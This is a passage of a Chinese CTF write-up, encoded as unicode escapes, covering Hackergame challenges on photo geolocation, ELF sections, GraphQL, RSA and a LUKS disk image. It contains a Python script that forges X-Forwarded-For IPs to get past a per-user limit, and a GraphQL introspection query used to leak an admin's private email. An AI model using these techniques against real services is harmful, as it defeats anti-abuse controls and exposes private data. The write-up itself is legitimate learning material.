\u4ece\u7167\u7247\u6765\u770b\uff0c\u9152\u5e97\u4f3c\u4e4e\u5728\u5c0f\u533a\u7684\u4e00\u680b\u9ad8\u697c\u91cc\uff0c\u9644\u8fd1\u8fd8\u6709\u4e00\u5bb6 KFC \u5206\u5e97\u3002\u7a81\u7136\uff0c\u4f60\u610f\u8bc6\u5230\u7167\u7247\u91cc\u900f\u9732\u51fa\u6765\u7684\u4fe1\u606f\u6bd4\u8868\u9762\u4e0a\u770b\u8d77\u6765\u7684\u8981\u591a\u3002 \u8bf7\u89c2\u5bdf\u7167\u7247\u5e76\u7b54\u5bf9\u5168\u90e8 5 \u9053\u9898\u4ee5\u83b7\u53d6 flag\u3002\u6ce8\u610f\uff1a\u56fe\u7247\u672a\u5728\u5176\u4ed6\u5730\u65b9\u516c\u5f00\u53d1\u5e03\u8fc7\uff0c\u4e5f\u672a\u91c7\u53d6\u4efb\u4f55\u9690\u5199\u63aa\u65bd\uff08\u901a\u8fc7\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\uff09\u3002 \u201c\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\u201d\uff0c\u6240\u4ee5\u7167\u7247\u4e2d\u6ca1\u6709\u4efb\u4f55\u5730\u5740\u7684\u5143\u4fe1\u606f\uff0c\u53ea\u80fd\u9760\u770b\u56fe \u7ebf\u7d22 \uff1a\u6d77\u8fb9\u3001KFC\u3001\u9ad8\u697c\u3001\u5927\u77f3\u5934\u3001\u505c\u8f66\u4f4d \u5148\u770b\u90a3\u4e2aKFC\uff0c\u5927\u6982\u662f\u4e2a\u7f51\u7ea2\u5e97\uff0c\u6240\u4ee5\u641c\u7d22 \u201c\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201d\uff0c\u67e5\u5230\u4e86\u79e6\u7687\u5c9b\uff0c\u800c\u4e14\u4e5f\u662f\u6d77\u8fb9 \u518d\u8fdb\u4e00\u6b65\u770b\u5730\u56fe\u548c\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u786e\u5b9a\u5730\u70b9\u5728 \u79e6\u7687\u5c9b\u65b0\u6fb3\u6d77\u5e95\u4e16\u754c \u7136\u540e\u662f5\u4e2a\u95ee\u9898 \u8be5\u7167\u7247\u62cd\u6444\u8005\u7684\u9762\u671d\u65b9\u5411\u4e3a\uff1a \u6839\u636e\u5730\u56fe\uff0c\u5bf9\u6bd4\u4e00\u4e0b\u5c31\u53ef\u4ee5\u5f97\u5230\uff0c\u9762\u671d\u65b9\u5411\u662f \u4e1c\u5357 \u8be5\u7167\u7247\u7684\u62cd\u6444\u65f6\u95f4\u5927\u81f4\u4e3a\uff1a \u6839\u636e\u9009\u9879\u91cc\u7684\u65f6\u95f4\uff0c\u4e0b\u5348\u662f\u4e24\u70b9\u534a\u5de6\u53f3\uff0c\u800c\u5728\u4e1c\u5317\u7684\u4e24\u70b9\u534a\u5de6\u53f3\u5176\u5b9e\u548c\u4e2d\u5348\u5dee\u4e0d\u591a\uff0c\u5f71\u5b50\u548c\u5149\u6e29\u4e5f\u4e0d\u592a\u50cf\u8fd9\u4e2a\u6837\u5b50\uff0c\u6240\u4ee5\u53ef\u4ee5\u786e\u5b9a\u65f6\u95f4\u5927\u81f4\u662f \u508d\u665a \u8be5\u7167\u7247\u7684\u62cd\u6444\u8005\u6240\u5728\u697c\u5c42\u4e3a\uff1a \u4e0d\u597d\u786e\u5b9a\uff0c\u4f46\u662f\u7b54\u6848\u53ef\u4ee5\u4ea4\u5f88\u591a\u6b21\uff0c\u6240\u4ee5\u4ece9\u5c42\u5de6\u53f3\u4f9d\u6b21\u8bd5\u5c31\u53ef\u4ee5\u4e86\uff0c\u6700\u540e\u5f97\u5230\u697c\u5c42\u662f 14 \u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u7684\u7535\u8bdd\u53f7\u7801\u662f\uff1a \u76f4\u63a5\u7528\u5730\u56fe\u8f6f\u4ef6\u641c \u201c\u79e6\u7687\u5c9b\u65b0\u6fb3 KFC\u201d \u5c31\u53ef\u4ee5\u67e5\u5230\u90a3\u5bb6\u5e97\u94fa\uff0c\u4e5f\u7ed9\u4e86\u7535\u8bdd\uff0c\u6216\u8005\u641c\u7d22 \u201d\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u7535\u8bdd\uff1a 0335-7168800 \u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u5de6\u4fa7\u5efa\u7b51\u6709\u4e09\u4e2a\u6c34\u5e73\u6392\u5217\u7684\u6c49\u5b57\uff0c\u5b83\u4eec\u662f\uff1a \u901a\u8fc7\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u770b\u5230 KFC \u5de6\u8fb9\u7684\u5efa\u7b51\u4e0a\u5199\u4e86 \u6d77\u8c5a\u9986 FLAG \u52a9\u529b\u5927\u7ea2\u5305 \u00b6 \u53c2\u4e0e\u6d3b\u52a8\uff0c\u52a9\u529b\u62bd\u5956\uff01\u96c6\u6ee1 1 \u4e2a flag\uff0c\u5373\u53ef\u63d0\u53d6 1 \u4e2a flag\u3002 \u606d\u559c\u4f60\u79ef\u6512\u5230 0.5\u2026\u2026 \u4e2a flag\uff0c \u5269\u4f59\u65f6\u95f4\uff1a10\u520600\u79d2 \u5df2\u6709 0 \u4f4d\u597d\u53cb\u4e3a\u60a8\u52a9\u529b\u3002 \u5c06\u5982\u4e0b\u94fe\u63a5\u5206\u4eab\u7ed9\u597d\u53cb\uff0c\u53ef\u4ee5\u83b7\u5f97\u597d\u53cb\u52a9\u529b\uff0c\u83b7\u5f97\u66f4\u591a flag\uff1a\u2026\u2026 \u8001\u5e76\u5915\u5915\u4e86 \uff0c\u7ecf\u8fc7\u4e00\u4e9b\u6d4b\u8bd5\u548c\u770b\u89c4\u5219\u53ef\u4ee5\u77e5\u9053\uff0cip \u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684\u7528\u6237\u88ab\u89c6\u4e3a\u540c\u4e00\u7528\u6237\uff0c\u5373 ip \u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u70b9\u524d\u9762\u7684\u6570\u5b57\u4e0d\u4e00\u6837\u624d\u662f\u4e0d\u540c\u7528\u6237 \u518d\u7528\u865a\u62df\u673a\u548c\u624b\u673a\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u6bcf\u4e2a\u7528\u6237\u589e\u52a0\u7684 flag \u6570\u91cf\u5f88\u5c0f \u6240\u4ee5\u63a8\u6d4b\u9700\u8981200+\u4e2a ip \u5730\u5740\uff0c\u80af\u5b9a\u4e0d\u4f1a\u8981\u771f\u7684\u8f6c\u53d1\uff0c\u800c\u4e14\u4e5f\u5f88\u96be\u51d1\u51fa\u5f88\u591a\u4e0d\u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684 ip \u4e8e\u662f\u5728 BurpSuite \u91cc\u9762\u6293\u5305\u53ef\u4ee5\u770b\u5230\uff0c\u6bcf\u6b21\u70b9\u51fb\u201c\u52a9\u529b\u201d\u90fd\u4f1a\u53d1\u9001\u4e00\u4e2a\u5230\u52a9\u529b\u94fe\u63a5\u7684 POST\uff0c\u5185\u5bb9\u4e3a ip \u5730\u5740 \u7136\u540e\u5c06\u5176\u53d1\u9001\u5230 Repeater \u4e2d\uff0c\u5c1d\u8bd5\u66f4\u6539 ip \u5730\u5740\uff0c\u5f97\u5230\u7684 Response \u4e2d\u8bf4 \u201c\u5931\u8d25\uff01\u68c0\u6d4b\u5230\u524d\u540e\u7aef\u68c0\u6d4b IPv4 \u5730\u5740\u4e0d\u5339\u914d\u201d \u6240\u4ee5\u4ec5\u4ec5\u66f4\u6539 POST \u5185\u5bb9\u7684 ip \u662f\u4e0d\u591f\u7684\uff0c\u800c\u63d0\u4f9b\u7ed9\u68c0\u6d4b\u7684\u5185\u5bb9\u4e5f\u4ec5\u4ec5\u662f\u4e00\u4e2a POST\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u6539 POST \u5934\uff0c\u6dfb\u52a0 X-Forwarded-For \u7136\u540e\u4f7f\u7528 python \u5c31\u53ef\u4ee5\u5faa\u73af\u53d1\u9001 POST \u5e76\u4f2a\u9020 ip \u5730\u5740\u5f97\u5230256\u4e2a\u52a9\u529b\u4e86\uff0c\u521a\u597d\u8fbe\u52301\u4e2aflag\uff1a \uff08\u8981\u6ce8\u610f sleep \u4e00\u6bb5\u65f6\u95f4\uff0c\u4e0d\u7136\u4f1a\u51fa\u73b0\u64cd\u4f5c\u8fc7\u5feb\u62d2\u7edd\u7684\u60c5\u51b5\uff1b\u4e5f\u4e0d\u8981 sleep \u8fc7\u957f\uff0c\u5426\u5219\u8d85\u8fc710\u5206\u949f flag \u5c31\u65e0\u6548\u4e86\uff09 import requests import time from tqdm import tqdm url = \"http://202.38.93.111:10888/invite/...\" with tqdm ( total = 256 ) as pbar : for i in range ( 256 ): res = requests . post ( url , data = { \"ip\" : f \" { i } .0.0.0\" }, headers = { \"X-Forwarded-For\" : f \" { i } .0.0.0\" }) if \"\u6210\u529f\" not in res . text : print ( \"[x] \u5931\u8d25\" ) print ( res . text ) time . sleep ( 1.5 ) pbar . update ( 1 ) Amnesia \u00b6 \u8f7b\u5ea6\u5931\u5fc6 \u00b6 \u4f60\u7684\u7a0b\u5e8f\u53ea\u9700\u8981\u8f93\u51fa\u5b57\u7b26\u4e32 Hello, world!\uff08\u7ed3\u5c3e\u6709\u65e0\u6362\u884c\u5747\u53ef\uff09\u5e76\u6b63\u5e38\u7ed3\u675f\u3002 \u7f16\u8bd1\u6307\u4ee4\uff1a gcc -O file.c -m32 \u8fd0\u884c\u6307\u4ee4\uff1a ./a.out \u7f16\u8bd1\u540e ELF \u6587\u4ef6\u7684 .data \u548c .rodata \u6bb5\u4f1a\u88ab\u6e05\u96f6\u3002 ELF\uff08Executable and Linkable Format\uff09\u662f Linux \u4e0b\u5e38\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\uff0c\u5176\u4e2d\u6709\u5f88\u591a\u4e0d\u540c\u7684\u8282\uff1a .text \u8282\uff1a\u7a0b\u5e8f\u8fd0\u884c\u9700\u8981\u7684\u4ee3\u7801 .data \u8282\uff1a\u5b58\u653e\u53ef\u4fee\u6539\u7684\u6570\u636e\uff0c\u4e00\u822c\u662f\u975e const \u5168\u5c40\u53d8\u91cf\u548c\u9759\u6001\u53d8\u91cf .rodata \u8282\uff1a\u5373 read only data\uff0c\u4e00\u822c\u662f\u5e38\u91cf\u6216\u8005\u5b57\u7b26\u4e32 .bss \u8282\uff1a\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u53d8\u91cf \u2026\u2026 \u800c\u8fd9\u9053\u9898\u76ee\u5219\u662f\u5728\u7f16\u8bd1\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6 a.out \u540e\uff0c\u6e05\u7a7a .data \u548c .rodata \u9996\u5148\u4e0d\u59a8\u6b63\u5e38\u7f16\u5199\u4e00\u4e2a\u8f93\u51fa \u201cHello, world!\u201d \u7684\u7a0b\u5e8f\uff1a printf ( \"Hello, world! \\n \" ); \u7136\u540e\u7f16\u8bd1\uff0c\u518d\u62d6\u5230 IDA \u91cc \u53ef\u4ee5\u53d1\u73b0\uff0c\u6b64\u65f6\u7684 \"Hello, world!\" \u88ab\u653e\u5230\u4e86 .rodata \u8282\u4e2d\uff0c\u4f1a\u88ab\u6e05\u9664\u6389\uff0c\u6240\u4ee5\u8fd9\u6837\u5199\u4e0d\u884c \u76f4\u63a5\u4f7f\u7528\u5b57\u7b26\u4e32\u4f1a\u88ab\u653e\u5230 .rodata \u4e2d\u6e05\u9664\uff0c\u5199\u6210\u5168\u5c40\u53d8\u91cf\u53c8\u4f1a\u653e\u5230 .data \u4e2d \u4f46\u662f\uff0c\u5982\u679c\u5199\u6210\u5c40\u90e8\u53d8\u91cf\u5462\uff1a char str [] = \"Hello, world! \\n \" ; printf ( str ); \u7f16\u8bd1\uff0c\u62d6\u5230 IDA \u91cc \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u6b21\u7684\u5b57\u7b26\u4e32\u76f4\u63a5\u5199\u5230\u4e86 .text \u8282\u4e2d\uff0c\u5220\u6389\u4e86 .data .rodata \u4e5f\u6ca1\u6709\u5f71\u54cd \u6240\u4ee5\u628a\u8fd9\u4e2a\u4ee3\u7801\u4ea4\u4e0a\u53bb\u5c31\u53ef\u4ee5\u8f93\u51fa \u201cHello, world!\u201c \u62ff\u5230 flag \u4e86 \u6e05\u9664\u8bb0\u5fc6\u76f4\u63a5\u628a .text \u8282\u5168\u5220\u6389\u4e86\uff0c\u60f3\u4e86\u5f88\u4e45\u4e5f\u4e0d\u77e5\u9053\u548b\u641e\uff0c\u867d\u7136\u53ef\u4ee5 __attribute__ ((section (\"...\"))) \u6765\u628a\u51fd\u6570\u6216\u53d8\u91cf\u585e\u5230\u6307\u5b9a\u7684\u8282\u4e2d\u3002\u4f46\u8fd8\u662f\u4e0d\u6e05\u695a\u8981\u600e\u4e48\u89e3\u51b3\u6bb5\u9519\u8bef\u7684\u95ee\u9898qwq \u56fe\u4e4b\u4e0a\u7684\u4fe1\u606f \u00b6 \u5c0f T \u542c\u8bf4 GraphQL \u662f\u4e00\u79cd\u7279\u522b\u7684 API \u8bbe\u8ba1\u6a21\u5f0f\uff0c\u4e5f\u662f RESTful API \u7684\u6709\u529b\u7ade\u4e89\u8005\uff0c\u6240\u4ee5\u4ed6\u5199\u4e86\u4e2a\u5c0f\u7f51\u7ad9\u6765\u5b9e\u9a8c\u8fd9\u9879\u6280\u672f\u3002 \u4f60\u80fd\u901a\u8fc7\u8fd9\u4e2a\u5168\u65b0\u7684\u63a5\u53e3\uff0c\u83b7\u53d6\u5230\u6ca1\u6709\u516c\u5f00\u51fa\u6765\u7684\u7ba1\u7406\u5458\u7684\u90ae\u7bb1\u5730\u5740\u5417\uff1f \u9898\u76ee\u4fe1\u606f\u7ed9\u7684\u5f88\u5145\u5206\uff0c\u7528\u7684\u662f GraphQL\uff0c\u8981\u7528\u5176\u5f97\u5230 admin \u7684\u90ae\u7bb1 \u6ca1\u63a5\u89e6\u8fc7 GraphQL\uff0c\u6240\u4ee5\u76f4\u63a5\u5fc5\u5e94\uff08\u9003 \u67e5\u5230\u4e86\u5f88\u591a\u6709\u7528\u7684\u4e1c\u897f\uff1a GraphQL\u5b98\u7f51 \uff1a\u4e86\u89e3\u4e00\u4e0b GraphQL \u662f\u5e72\u4ec0\u4e48\u7684\uff0c\u8981\u600e\u4e48\u7528 GraphiQL \uff1a\u4e00\u4e2a\u8fdb\u884c GraphQL \u67e5\u8be2\u7684 GUI \u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e GraphQL Voyager \uff1a\u53ef\u89c6\u5316\u73b0\u5b9e GraphQL \u5185\u7701\u51fa\u7684\u7ed3\u6784 \u7b80\u800c\u8a00\u4e4b\uff0cGraphQL \u5c31\u662f\u4e00\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e00\u6b21 query \u8bf7\u6c42\u67e5\u8be2\u591a\u4e2a\u8d44\u6e90\u7684 API \u6a21\u5f0f\uff0c\u53ea\u8981 \u7f51\u5740/graphql?query=... \u5c31\u53ef\u4ee5\u5b9e\u73b0\u67e5\u8be2 \u6709\u4e9b\u4f7f\u7528 GraphQL \u7684\u7f51\u7ad9\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u8bbf\u95ee \u7f51\u5740/graphiql \u5f97\u5230\u67e5\u8be2\u7684 GUI \u4f46\u662f\u672c\u9898\u4e2d\u7981\u6b62\u4e86\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 GraphiQL \u8f6f\u4ef6\u6765\u8fdb\u884c\u67e5\u8be2 \u5728\u7b2c\u4e09\u4e2a\u94fe\u63a5\u4e2d\u53ef\u4ee5\u4e86\u89e3\u5230\uff0c\u53ef\u4ee5\u5229\u7528 GraphQL \u7684\u5185\u7701\u67e5\u8be2\u6765\u6cc4\u9732\u51fa\u5185\u90e8\u7684\u7ed3\u6784\uff0c\u628a\u5176\u4e2d\u7684\u67e5\u8be2\u8bed\u53e5\u4e22\u5230 GraphiQL \u4e2d\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } }}fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef }}fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue}fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }} \u7136\u540e\u628a\u7ed3\u679c\u4e22\u5230 GraphQL Voyager \u4e2d\u5c31\u53ef\u4ee5\u5f97\u5230\u53ef\u89c6\u5316\u7684\u7ed3\u6784\uff1a \u6240\u4ee5\u53ea\u9700\u8981\u6839\u636e id query \u4e00\u4e0b user \u5c31\u53ef\u4ee5\u4e86\uff1a query { user ( id : 1 ) { privateEmail , } } >>> { \"data\" : { \"user\" : { \"privateEmail\" : \"flag{...}\" } } } Easy RSA \u00b6 \u81ea\u4ece Hackergame 2018 \u516c\u7136\u63ed\u9732\u4e86\u5927\u6574\u6570\u53ef\u4ee5\u88ab\u795e\u7ae5\u53e3\u7b97\u5206\u89e3\u7684\u4e8b\u5b9e\uff0cRSA \u5728 hackergame \u4e2d\u5df2\u7ecf\u53ea\u80fd\u5904\u4e8e\u4f4e\u5206\u503c\u7684\u5730\u4f4d\u4e86\u3002\u5982\u679c\u4e0d\u5728\u5176\u540d\u79f0\u524d\u9762\u52a0\u4e0a Easy \u8fd9\u4e2a\u5355\u8bcd\uff0c\u4f3c\u4e4e\u5c31\u4f1a\u663e\u5f97\u5b8c\u5168\u5bf9\u4e0d\u8d77\u5176\u4ed6\u9898\u76ee\u3002 \u66f4\u4f55\u51b5\uff0c\u5728\u672c\u9898\u7684\u9644\u4ef6\u4e2d\uff0c\u4f60\u8fd8\u83b7\u5f97\u4e86\u6784\u9020 p \u548c q \u7684\u65b9\u5f0f\u3002\u6570\u7406\u57fa\u7840\u624e\u5b9e\u7684\u4f60\u5e94\u8be5\u53ef\u4ee5\u8f7b\u677e\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u5427\u3002 \u8c22\u9080\uff0c\u6ca1\u6709\u6570\u7406\u57fa\u7840 \u770b\u4ee3\u7801\uff01 e = 65537 def get_p (): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 value_p = sympy . nextprime (( math . factorial ( y )) % x ) # Hint\uff1a\u8fd9\u91cc\u76f4\u63a5\u8ba1\u7b97\u4f1a\u6ea2\u51fa\uff0c\u8bf7\u4f60\u4ed4\u7ec6\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81 return value_p def get_q (): value = [ getPrime ( 256 )] for i in range ( 1 , 10 ): value . append ( sympy . nextprime ( value [ i - 1 ])) print ( \"value[-1] = \" , value [ - 1 ]) # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967 n = 1 for i in range ( 10 ): n = n * value [ i ] q = getPrime ( 512 ) value_q = pow ( q , e , n ) print ( \"value_q = \" , value_q ) # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 return sympy . nextprime ( q ) # this destroyes the rsa cryptosystem p = get_p () q = get_q () m = int . from_bytes ( open ( \"flag.txt\" , \"rb\" ) . read (), \"big\" ) c = pow ( m , e , p * q ) print ( \"c = \" , c ) # c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478 \u53ef\u4ee5\u770b\u5230\uff0c\u5176\u4e2d\u8981\u89e3\u51b3\u7684\u5c31\u662f get_p() \u4e2d y! % x \u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u4ee5\u53ca get_q() \u4e2d q \u662f\u54ea\u4e2a\u968f\u673a\u7684512\u4f4d\u8d28\u6570\u7684\u95ee\u9898 get_p : \u4ee3\u7801\u91cc\u4e5f\u7ed9\u4e86 Hint\uff0c\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81\u3002x \u548c y \u90fd\u5f88\u5927\uff0c\u4f46\u662f\u4e24\u4e2a\u7684\u5dee\u5e76\u4e0d\u5927\uff1b\u800c\u4e14\u53ef\u4ee5\u4e22\u5230 python \u91cc\u9a8c\u8bc1\u51fa x \u662f\u4e00\u4e2a\u8d28\u6570 \u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 \u5a01\u5c14\u900a\u5b9a\u7406 \u4e5f\u67e5\u5230\u4e86\u5a01\u5c14\u900a\u5b9a\u7406\u5728 RSA \u9898\u76ee\u4e2d\u7684\u5e94\u7528\uff1a BUU-RSA [RoarCTF2019]babyRSA \u8981\u6c42 y! % x\uff08x\u662f\u8d28\u6570\uff09 \u6839\u636e\u5a01\u5c14\u900a\u5b9a\u7406\uff0c\u6709 \\[ (x - 1)! \\equiv -1\\pmod{x} \\] \u6240\u4ee5\uff1a \\[ y!\\times \\frac{(x - 1)!}{y!}\\equiv -1\\pmod{x} \\] \u4ee4 \\(k = \\dfrac{(x - 1)!}{y!} = (y+1)(y+2)...(x-1)x\\) \uff0c\u6240\u4ee5\u6709\uff1a \\[ y!\\equiv -\\mathrm{inv}(k, x)\\pmod{x} \\] \uff08\u5176\u4e2d \\(\\mathrm{inv}(k, x)\\) \u8868\u793a\u6a21 x \u4e0b k \u7684\u9006\u5143\uff09 \u6240\u4ee5\u91cd\u5199 get_p() \u5373\u53ef\u6b63\u786e\u7684\u5f97\u5230 p\uff1a def get_p (): x = ... y = ... k = 1 for i in range ( y + 1 , x ): k = ( k * i ) % x res = ( - gmpy2 . invert ( k , x )) % x return sympy . nextprime ( res ) get_q : \u76f8\u6bd4\u6765\u8bf4\uff0cget_q \u5c31\u6ca1\u90a3\u4e48\u9700\u8981\u6280\u5de7\u4e86 \u7ed9\u51fa\u4e86 value[-1] \u7684\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528 sympy.prevprime \u9006\u63a8\u51fa\u6574\u4e2a value \u6570\u7ec4 value = [ 80096058210213458444437404275177554701604739094679033012396452382975889905967 ] for i in range ( 1 , 10 ): value . append ( sympy . prevprime ( value [ i - 1 ])) print ( \"value[-1] = \" , value [ - 1 ]) \u540e\u9762\u8ba1\u7b97 value_q \u7ec6\u770b\u5176\u5b9e\u4e5f\u662f\u4e00\u4e2a RSA \u7b97\u6cd5\uff1a q\uff1a\u5bc6\u6587 e\uff1a\u79c1\u94a5 value_q\uff1a\u660e\u6587 n\uff1a\u5c31\u662f n\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u662f\u4e24\u4e2a\u8d28\u6570\u76f8\u4e58\uff0c\u662f\u5341\u4e2a\u8d28\u6570\u76f8\u4e58 \u5341\u4e2a\u8d28\u6570\u76f8\u4e58\u5f97\u5230 n \u7684 RSA \u7b97\u6cd5\u4e5f\u4e00\u6837\uff0c\u56e0\u4e3a RSA \u7684\u6b63\u786e\u6027\u5e76\u6ca1\u6709\u8981\u6c42 n \u4e00\u5b9a\u662f\u4e24\u4e2a\u5927\u8d28\u6570\u76f8\u4e58\uff0c\u8fd9\u6837\u53ea\u662f\u96be\u4ee5\u7834\u89e3\u4fdd\u8bc1\u5b89\u5168\u6027 \u89e3\u51b3\u8fd9\u4e2a\u540c\u6837\u4e5f\u662f\u9700\u8981\u516c\u94a5 d\uff0c\u6240\u4ee5\u9700\u8981 phi(n) \u6839\u636e \u6b27\u62c9\u51fd\u6570 \u7684\u6027\u8d28\uff0cphi(n) \u7b49\u4e8e n \u7684\u6240\u6709\u8d28\u56e0\u6570\u51cf\u4e00\u7684\u79ef \u5373 phi(n) = (value[0] - 1) * (value[1] - 1) * ... * (value[9] - 1) \u518d\u89e3\u5bc6\u5373\u53ef\u5f97\u5230\u5bc6\u6587 q\uff0c\u7136\u540e\u4e5f\u5c31\u5f97\u5230\u4e86 get_q \u7684\u7ed3\u679c n = phi = 1 for i in range ( 10 ): n = n * value [ i ] phi *= ( value [ i ] - 1 ) value_q = ... d = pow ( e , - 1 , phi ) q = pow ( value_q , d , n ) return sympy . nextprime ( q ) flag : \u641e\u5b9a\u4e86 get_p \u548c get_q \u4e4b\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u89e3\u51fa flag \u4e86\uff1a e = 65537 p = get_p () q = get_q () c = ... d = pow ( e , - 1 , ( p - 1 ) * ( q - 1 )) m = pow ( c , d , p * q ) print ( int . to_bytes ( m , 30 , byteorder = \"big\" )) \u52a0\u5bc6\u7684 U \u76d8 \u00b6 \uff08\u672c\u6765\u633a\u597d\u505a\u7684\u4e00\u9053\u9898\uff0c\u600e\u4e48\u9898\u7ed9\u7684\u63d0\u793a\u6211\u5c31\u786c\u662f\u6ca1\u9886\u4f1a\u5230\uff09 \u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e LUKS (Linux Unified Key Setup) \u7684\u6545\u4e8b\u3002 \u7b2c\u4e00\u5929 \u5c0f T\uff1a\u300c\u4f60\u8981\u7684\u968f\u673a\u8fc7\u7a0b\u7684\u8bfe\u4ef6\u6211\u5e2e\u4f60\u62f7\u597d\u4e86\uff0c\u5728\u8fd9\u4e2a U \u76d8\u91cc\uff0cLUKS \u52a0\u5bc6\u7684\u5bc6\u7801\u662f suijiguocheng123123\u3002\u300d \u5c0f Z\uff1a\u300c\u554a\uff0c\u4f60\u53c8\u641e\u4e86 Linux \u6587\u4ef6\u7cfb\u7edf\u52a0\u5bc6\uff0c\u771f\u62ff\u4f60\u6ca1\u529e\u6cd5\u3002\u6211\u73b0\u5728\u4e0d\u65b9\u4fbf\u7528 Linux\uff0c\u6211\u76f4\u63a5\u628a\u8fd9\u5757\u76d8\u505a\u6210\u78c1\u76d8\u955c\u50cf\u6587\u4ef6\u518d\u56de\u53bb\u5904\u7406\u5427\u3002\u300d \u7b2c\u4e8c\u5929 \u5c0f Z\uff1a\u300c\u8c22\u8c22\u4f60\u6628\u5929\u5e2e\u6211\u62f7\u7684\u8bfe\u4ef6\u3002\u4f60\u6bcf\u6b21\u90fd\u641e\u8fd9\u4e2a\u52a0\u5bc6\uff0c\u5b83\u771f\u7684\u5b89\u5168\u5417\uff1f\u300d \u5c0f T\uff1a\u300c\u5f53\u7136\u4e86\uff01\u4f60\u770b\uff0c\u4f60\u8fd8\u7ed9\u6211\u4e4b\u540e\uff0c\u6211\u5df2\u7ecf\u628a\u8fd9\u5757\u76d8\u7684\u5f31\u5bc6\u7801\u6539\u6389\u4e86\uff0c\u73b0\u5728\u662f\u968f\u673a\u751f\u6210\u7684\u5f3a\u5bc6\u7801\uff0c\u8fd9\u6837\u9664\u4e86\u6211\u81ea\u5df1\uff0c\u4e16\u754c\u4e0a\u4efb\u4f55\u4eba\u90fd\u65e0\u6cd5\u89e3\u5bc6\u5b83\u4e86\u3002\u300d \u5c0f Z\uff1a\u300c\u6211\u53ef\u4e0d\u4fe1\u3002\u300d \u5c0f T\uff1a\u300c\u4f60\u4e0d\u4fe1\uff1f\u4f60\u770b\uff0c\u6211\u73b0\u5728\u5f80 U \u76d8\u91cc\u653e\u4e00\u4e2a flag \u6587\u4ef6\uff0c\u7136\u540e\u8fd9\u4e2a U \u76d8\u5c31\u7ed9\u4f60\u4e86\uff0c\u4f60\u7edd\u5bf9\u89e3\u5bc6\u4e0d\u51fa\u6765\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002\u5f53\u521d\u641e LUKS \u7684\u65f6\u5019\u6211\u53ef\u7814\u7a76\u4e86\u597d\u51e0\u5929\uff0c\u73ed\u4e0a\u53ef\u6ca1\u4eba\u6bd4\u6211\u66f4\u61c2\u52a0\u5bc6\uff01\u300d \u4e00\u5171\u7ed9\u4e86\u4e24\u4e2a img \u6587\u4ef6\uff0c\u901a\u8fc7 file \u53ef\u4ee5\u770b\u51fa\u90fd\u662f DOS/MBR boot sector $ file *.img day1.img: DOS/MBR boot sector ; partition 1 : ID = 0xee, start-CHS ( 0x0,0,2 ) , end-CHS ( 0x3ff,255,63 ) , startsector 1 , 40959 sectors, extended partition table ( last ) day2.img: DOS/MBR boot sector ; partition 1 : ID = 0xee, start-CHS ( 0x0,0,2 ) , end-CHS ( 0x3ff,255,63 ) , startsector 1 , 40959 sectors, extended partition table ( last ) \u6240\u4ee5\u5148\u76f4\u63a5 7z \u63d0\u53d6\uff0c\u5f97\u5230\u4e24\u4e2a\u65b0\u7684 img\uff0c\u518d file\uff1a $ file 